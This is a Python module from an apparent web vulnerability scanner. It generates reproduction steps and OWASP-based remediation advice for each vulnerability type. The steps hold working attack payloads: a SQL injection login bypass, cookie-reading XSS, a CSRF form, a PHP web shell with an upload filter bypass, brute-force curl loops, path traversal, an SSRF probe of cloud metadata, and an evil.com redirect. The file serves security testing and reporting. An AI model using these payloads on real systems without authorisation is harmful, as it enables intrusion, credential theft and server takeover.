# FILE: backend/services/reproduce_service.py
# PURPOSE: Generates concrete "How to Reproduce" step lists per vulnerability type
# SECURITY NOTE: Steps are educational text only — replace [target_url] with actual target

OWASP_REFS = {
    "sql_injection":           "https://owasp.org/www-project-top-ten/2021/A03_2021-Injection",
    "xss":                     "https://owasp.org/www-project-top-ten/2021/A03_2021-Injection",
    "csrf":                    "https://owasp.org/www-project-top-ten/2021/A01_2021-Broken_Access_Control",
    "file_upload":             "https://owasp.org/www-project-top-ten/2021/A04_2021-Insecure_Design",
    "broken_auth":             "https://owasp.org/www-project-top-ten/2021/A07_2021-Identification_and_Authentication_Failures",
    "security_misconfig":      "https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration",
    "sensitive_data_exposure": "https://owasp.org/www-project-top-ten/2021/A02_2021-Cryptographic_Failures",
    "logging_monitoring":      "https://owasp.org/www-project-top-ten/2021/A09_2021-Security_Logging_and_Monitoring_Failures",
    "supply_chain":            "https://owasp.org/www-project-top-ten/2021/A06_2021-Vulnerable_and_Outdated_Components",
    "cryptographic_failure":   "https://owasp.org/www-project-top-ten/2021/A02_2021-Cryptographic_Failures",
    "insecure_design":         "https://owasp.org/www-project-top-ten/2021/A04_2021-Insecure_Design",
    "exceptional_conditions":  "https://owasp.org/www-project-top-ten/2021/A04_2021-Insecure_Design",
    "underprotected_apis":     "https://owasp.org/www-project-top-ten/2021/A01_2021-Broken_Access_Control",
}

REMEDIATION = {
    "sql_injection": "Use parameterised queries / prepared statements. Never concatenate user input into SQL strings. Apply an ORM with built-in escaping.",
    "xss": "Set a strict Content-Security-Policy header. Use framework-level output encoding. Sanitise all user-supplied HTML with an allowlist (e.g. bleach).",
    "csrf": "Implement CSRF tokens on all state-changing forms. Set SameSite=Strict on session cookies. Validate the Origin/Referer header server-side.",
    "file_upload": "Validate MIME type via libmagic (not Content-Type header). Rename files to UUIDs. Serve uploads from a separate origin. Restrict executable extensions.",
    "broken_auth": "Enforce rate limiting and account lockout. Use bcrypt/argon2 for passwords. Invalidate sessions on logout. Implement MFA.",
    "security_misconfig": "Add all security headers (CSP, HSTS, X-Frame-Options, etc). Disable unused HTTP methods. Remove debug/backup files from production.",
    "sensitive_data_exposure": "Enforce HTTPS everywhere with HSTS. Set HttpOnly + Secure + SameSite on cookies. Mask sensitive fields in API responses. Add Cache-Control: no-store on sensitive pages.",
    "logging_monitoring": "Log all auth events, admin actions, and attack payloads. Alert on brute force. Protect logs from tampering. Never log passwords.",
    "supply_chain": "Pin dependency versions. Run npm audit / pip-audit in CI. Add SRI hashes to CDN scripts. Avoid typosquatted packages.",
    "cryptographic_failure": "Enforce TLS 1.2+ only. Use HSTS with preload. Hash passwords with bcrypt. Rotate secrets. Never use ECB mode.",
    "insecure_design": "Implement object-level authorization on every endpoint. Validate ownership server-side. Deny by default.",
    "exceptional_conditions": "Validate and sanitise all inputs. Handle exceptions gracefully without leaking stack traces. Implement timeouts and size limits.",
    "underprotected_apis": "Require authentication on all API endpoints. Enable rate limiting. Disable GraphQL introspection in production. Remove /swagger in production.",
}


def generate_reproduce_steps(vuln_type: str, target_url: str, finding_summary: str) -> list[str]:
    """Generate concrete numbered reproduction steps based on vuln type and finding."""
    t = target_url.rstrip("/")

    steps_map: dict[str, list[str]] = {

        "sql_injection": [
            f"1. Navigate to the login page at {t}/login (or any search/filter field)",
            "2. In the username field, enter the payload:  ' OR '1'='1'--",
            "3. Enter any value in the password field (e.g. 'anything')",
            "4. Click Submit / Login",
            "5. Observe: login succeeds without valid credentials",
            "Expected: Access granted as the first user in the database",
            "Tool: Browser / Burp Suite / curl",
            f"curl -X POST {t}/api/auth/login -H 'Content-Type: application/json' -d '{{\"username\":\"' OR '1'='1'--\",\"password\":\"x\"}}'",
        ],

        "xss": [
            f"1. Navigate to any comment, search, or input field on {t}",
            "2. Enter the payload:  <script>alert(document.cookie)</script>",
            "3. Submit the form or trigger the action",
            "4. Observe: a JavaScript alert box appears showing your session cookie",
            "Expected: Alert box displays document.cookie value",
            "Tool: Browser (check DevTools console if alert is blocked)",
            "Alternative payload: <img src=x onerror=alert(1)>",
            f'curl -X POST {t}/api/comments -d \'{{"content":"<script>alert(1)</script>"}}\' -H "Content-Type: application/json"',
        ],

        "csrf": [
            f"1. Log in to {t} in your normal browser (Browser A)",
            "2. Create a new HTML file on your desktop with this content:",
            f'   <form action="{t}/api/profile" method="POST">',
            '     <input name="email" value="attacker@evil.com">',
            '   </form>',
            '   <script>document.forms[0].submit()</script>',
            "3. Open that HTML file in Browser A while still logged in",
            "4. Observe: the profile update fires without user interaction",
            "5. Check the server logs — no CSRF token was validated",
            "Tool: Any text editor + browser",
        ],

        "file_upload": [
            f"1. Navigate to the file upload page on {t}",
            "2. Create a file named 'shell.php' with contents:",
            "   <?php system($_GET['cmd']); ?>",
            "3. Upload the file (rename to shell.php.jpg if extension filter exists)",
            f"4. Navigate to: {t}/uploads/shell.php?cmd=id",
            "5. Observe: OS command output returned in the HTTP response",
            "Expected: Output of the 'id' command (e.g. uid=33(www-data)...)",
            "Tool: Browser / curl / Burp Suite",
        ],

        "broken_auth": [
            f"1. Navigate to the login page at {t}/login",
            "2. Open Burp Suite Intruder or use the following curl loop:",
            f"   for p in admin password 123456 admin123 test; do curl -s -X POST {t}/api/auth/login -d '{{\"username\":\"admin\",\"password\":\"$p\"}}' -H 'Content-Type: application/json'; done",
            "3. Send 100+ requests with different passwords",
            "4. Observe: no rate limiting, no 429 response, no account lockout",
            "5. Also test: reuse the same session token after logout",
            "Expected: Account lockout after 10 attempts OR 429 Too Many Requests",
            "Tool: Burp Suite Intruder / Hydra / custom curl loop",
        ],

        "security_misconfig": [
            f"1. Open a terminal and run: curl -I {t}",
            "2. Examine the response headers carefully",
            "3. Verify these headers are ABSENT in the response:",
            "   - Content-Security-Policy",
            "   - X-Frame-Options",
            "   - X-Content-Type-Options",
            "   - Strict-Transport-Security",
            f"4. Try loading {t} inside an iframe: <iframe src='{t}'></iframe>",
            "5. Observe: page loads in iframe (clickjacking possible)",
            f"6. Also check: curl -X OPTIONS {t} -v  (look for TRACE/PUT in Allow header)",
            "Tool: curl / browser DevTools Network tab / SecurityHeaders.com",
        ],

        "sensitive_data_exposure": [
            f"1. Open terminal and run: curl -v http://{target_url.replace('https://','').replace('http://','')}",
            "2. Submit a login request over plain HTTP",
            "3. Run: tcpdump -i any -A 'tcp port 80' (or open Wireshark)",
            "4. Observe: username and password visible in plaintext network traffic",
            f"5. Also check: curl -I {t} | grep -i strict-transport",
            "6. Observe: Strict-Transport-Security header absent",
            "Expected: Credentials encrypted by TLS; HSTS header present",
            "Tool: curl / Wireshark / mitmproxy",
        ],

        "logging_monitoring": [
            f"1. Send 200 failed login requests to {t}/api/auth/login with wrong passwords",
            f"   for i in {{1..200}}; do curl -s -X POST {t}/api/auth/login -d '{{\"username\":\"admin\",\"password\":\"wrong\"}}' -H 'Content-Type: application/json'; done",
            "2. Observe: no rate limiting triggered, no account lockout, no 429",
            f"3. Check if log endpoints are accessible: curl {t}/logs  or  curl {t}/actuator",
            "4. Trigger a server error and check if stack trace is returned to the user",
            "5. Observe: attack proceeds entirely undetected",
            "Expected: Alert fired, attacker IP blocked, attack logged with payloads",
            "Tool: curl / bash loop",
        ],

        "supply_chain": [
            f"1. View the page source of {t}: curl {t} | grep '<script'",
            "2. Identify all external JavaScript includes (CDN, third-party)",
            "3. For each external script, check for the 'integrity=' attribute",
            "4. If integrity= is missing, the script can be tampered at the CDN",
            "5. Run: npm audit  (if you have access to the source repository)",
            "6. Run: pip-audit  (for Python backend dependencies)",
            "Expected: All external scripts have SRI integrity= hash",
            "Tool: curl / browser DevTools / npm audit / pip-audit",
        ],

        "cryptographic_failure": [
            f"1. Run: curl -v --tls-max 1.1 {t}",
            "   Observe: if connection succeeds, TLS 1.0/1.1 is accepted (insecure)",
            f"2. Run: curl -I {t} | grep -i strict-transport",
            "   Observe: if absent, HTTPS not enforced via HSTS",
            f"3. Check certificate: echo | openssl s_client -connect {target_url.replace('https://','').replace('http://','').split('/')[0]}:443 2>&1 | grep 'Verify return'",
            "4. Check SSL Labs score: https://www.ssllabs.com/ssltest/",
            "Expected: TLS 1.2+ only, HSTS present, A+ SSL Labs rating",
            "Tool: curl / openssl / SSL Labs / testssl.sh",
        ],

        "insecure_design": [
            f"1. Log in to {t} as a regular user (e.g. user ID = 5)",
            f"2. Make a request to: GET {t}/api/users/1  (or /api/orders/1, /api/profile/1)",
            "3. Observe: another user's data is returned without ownership check",
            f"4. Try: PATCH {t}/api/profile with body: {{\"role\": \"admin\"}}",
            "5. Observe: role changed to admin (mass assignment vulnerability)",
            "Expected: 403 Forbidden — server must verify resource ownership",
            "Tool: Browser / Burp Suite / curl",
            f'curl -X GET {t}/api/users/1 -H "Authorization: Bearer <your_token>"',
        ],

        "exceptional_conditions": [
            f"1. Run: curl '{t}/?id=<script>alert(1)</script>' -v",
            "   Observe: if 500 error with stack trace returned",
            f"2. Run: curl '{t}/static/../../../../etc/passwd'",
            "   Observe: if /etc/passwd contents returned (path traversal)",
            f"3. Test SSRF: curl '{t}/api/fetch?url=http://169.254.169.254/latest/meta-data/'",
            "   Observe: if AWS metadata returned (SSRF vulnerability)",
            f"4. Test open redirect: curl -v '{t}/?redirect=http://evil.com'",
            "   Observe: if 302 redirect to evil.com in Location header",
            "Expected: 400 Bad Request with generic error; no internal details exposed",
            "Tool: curl / Burp Suite",
        ],

        "underprotected_apis": [
            f"1. Run: curl {t}/graphql -H 'Content-Type: application/json' -d '{{\"query\":\"{{__schema{{types{{name}}}}}}}}'",
            "   Observe: full GraphQL schema returned (introspection enabled)",
            f"2. Run: curl {t}/swagger-ui.html  or  curl {t}/openapi.json",
            "   Observe: full API documentation accessible without authentication",
            f"3. Run: curl {t}/api/admin/users  (no Authorization header)",
            "   Observe: user list returned without authentication",
            "4. Send 1000 rapid requests and observe if any 429 responses appear",
            "Expected: GraphQL introspection disabled; docs require auth; rate limiting active",
            "Tool: curl / Postman / GraphQL Playground",
        ],
    }

    steps = steps_map.get(vuln_type)
    if not steps:
        return [
            f"1. Navigate to {t}",
            f"2. Probe the vulnerability: {finding_summary[:120]}",
            "3. Observe the server response for indicators of vulnerability",
            "4. Document findings and compare with secure baseline",
            "Tool: curl / Browser / Burp Suite",
        ]

    # Inject specific finding detail into the steps when relevant
    if finding_summary and len(finding_summary) > 10:
        steps = [steps[0]] + [f"Finding: {finding_summary[:150]}"] + steps[1:]

    return steps


def get_owasp_ref(vuln_type: str) -> str:
    return OWASP_REFS.get(vuln_type, "https://owasp.org/www-project-top-ten/")


def get_remediation(vuln_type: str) -> str:
    return REMEDIATION.get(vuln_type, "Review OWASP guidelines and apply defence-in-depth.")
